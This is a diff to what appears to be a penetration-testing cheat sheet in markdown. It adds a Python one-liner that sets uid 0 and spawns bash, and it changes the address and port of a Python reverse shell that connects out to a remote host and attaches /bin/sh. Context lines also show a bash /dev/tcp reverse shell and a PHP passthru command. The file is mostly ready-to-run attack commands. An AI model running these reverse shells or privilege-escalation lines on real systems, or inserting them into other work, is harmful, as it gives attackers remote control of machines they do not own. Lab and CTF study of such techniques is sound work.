@@ -71,6 +71,13 @@ If you are unsure whether they are enabled on your system, the following will re
 <?php passsthru("ls -la"); ?>
 ```
 
+## Shells
+
+### Python
+
+```console
+$ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
 
 ## Reverse Shells
 
@@ -94,7 +101,7 @@ bash -i >& /dev/tcp/10.38.1.112/4444 0>&1
 ### Python
 
 ```console
-python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.38.1.112",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.20.70",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
 
 ## msfvenom
